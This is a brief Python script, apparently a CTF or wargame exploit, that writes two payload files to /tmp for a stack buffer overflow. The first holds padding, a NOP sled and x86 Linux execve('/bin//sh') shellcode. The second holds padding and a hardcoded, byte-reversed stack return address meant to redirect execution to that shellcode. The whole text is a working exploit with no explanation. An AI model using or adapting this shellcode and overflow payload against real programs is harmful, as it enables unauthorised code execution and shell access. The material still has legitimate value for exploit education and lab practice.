#!/usr/bin/python

SHELL_CODE = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'

with open('/tmp/first', 'w') as fd:
    fd.write('A' * 20 + '\x90' * 200 + SHELL_CODE)

with open('/tmp/second', 'w') as fd:
    fd.write('B' * 9 + '\xbf\xff\xe6\xb8'[::-1] + '\x90' * 7)
